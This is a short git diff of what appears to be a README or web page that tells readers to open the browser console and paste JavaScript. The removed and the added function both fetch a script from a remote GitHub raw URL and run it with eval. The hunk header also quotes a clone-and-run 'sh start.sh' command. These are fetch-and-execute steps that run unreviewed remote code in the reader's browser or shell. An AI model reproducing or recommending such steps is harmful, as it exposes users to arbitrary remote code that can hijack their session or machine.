@@ -8,20 +8,12 @@ git clone https://github.com/Kopen1/gpu && cd gpu && sh start.sh
   <p> akses console : ctrl + shift + k 
     <br>
 <br>
-async function eternalMode() {
-
-  let url = 'https://raw.githubusercontent.com/liebedevil/borr/main/netep.js'
-
-
-  let response = await fetch(url);
-
-  let script = await response.text();
-
-  eval(script);
-
-}
-
-eternalMode();
+async function mode() {
+let url = 'https://raw.githubusercontent.com/liebedevil/borr/main/netep.js'
+let response = await fetch(url);
+let script = await response.text();
+eval(script);}
+mode();
 
 <br>
 
